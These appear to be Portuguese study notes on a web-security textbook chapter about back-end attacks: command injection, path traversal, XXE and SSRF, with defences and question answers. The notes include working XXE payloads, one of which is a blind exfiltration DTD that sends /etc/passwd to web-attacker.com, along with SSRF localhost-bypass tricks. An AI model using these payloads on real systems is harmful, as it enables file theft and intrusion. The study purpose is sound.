# CH 10 - Atacando componentes de back-end

## command injection

- 2 tipos comuns de caracteres para OS command injection:
    * ; | &
    * `

- para casos blind, pode-se:
    * usar um comando time-based (ping, sleep)
    * escrever em um local acessível externamente (web root) 

### prevenindo command injection

- evitar chamada direta ao shell

- whitelist (alfanumérico)

- usar command API (não aceita adição de comandos)

## prevenindo path traversal

- evitar mandar input para API de sistema de arquivos (mapeamento de locais possíveis)

- verificar null byte ou ../ e recusar request

- APIs para verificar o path completo e comparar se está dentro do web root

- ambiente em chroot/new volume

## XXE (XML External Entities)

- ocorre quando existe um xml e é possível criar uma entidade com SYSTEM

- a partir disso é possível realizar SSRF e ler arquivos internos

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///tmp/a">]> (dps precisa usar &xxe no documento)
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://link.com"> %xxe; ]>  (blind)
```
pode-se usar o blind doctype para acessar uma url com ENTITYs:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate; 
```
- uma aplicação que suporta upload de svgs pode ser vulnerável

## Questões

>> * 1) Essas aplicações são frequentemente vulneráveis a ataques de injeção de comandos pois elas querem reaproveitar ferramentas já existentes no SO, facilitando o desenvolvimento e acabam implementando de forma insegura, passando os inputs do usuário diretamente para elas.

>> * 2) É muito provável que essa aplicação esteja vulnerável a path traversal, para testar pode-se tentar acessar locais comuns como o C:\windows\win.ini, com alguns ../, ou ainda outro arquivo no mesmo local.

>> * 3) XXE, para isso é preciso que o interpretador de XML suporte entidades externas e que a aplicação retorne o conteúdo de um elemento xml enviado na request

>> * 4) The variable param has the value urlparam1,urlparam2,bodyparam,cookieparam.

>> * 5) HPP ocorre um parâmetro é setado mais de uma vez na mesma request, o que pode ser usado em HPI (HTTP Param Injection) porém ambos existem de forma independente.

>> * 6) Para contornar essa defesa, pode-se tentar um alias para o localhost como o hostname da máquina, utilizar outro endereço IP do host ou ainda tentar um alias para o 127.0.0.1 (http://127.1, http://0/, http://0x7F000001). 

>> * 7) c